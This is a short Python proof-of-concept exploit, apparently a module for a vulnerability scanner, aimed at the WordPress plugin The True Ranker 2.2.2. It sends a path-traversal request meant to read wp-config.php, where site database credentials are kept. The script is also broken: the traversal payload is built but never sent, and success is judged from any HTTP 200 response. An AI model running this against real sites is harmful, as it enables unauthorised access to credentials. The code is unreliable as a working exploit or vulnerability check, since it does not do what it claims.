# coding: utf-8
import requests
import re

#WordPress Plugin The True Ranker 2.2.2 - Arbitrary File Read (Unauthenticated)
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    header = {'User-Agent': user_agent}

    # 漏洞位置
    exploit_url = url + '/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php'
    data={
        'src':'/scripts/simple.php/../../../../../../../../../../wp-config.php'
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exploit_url, headers=header,proxies=proxies)
    else:
        response = requests.post(exploit_url, headers=header)


    if response.status_code==200:
        return 'WordPress Plugin The True Ranker 2.2.2 - 任意文件读取'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result


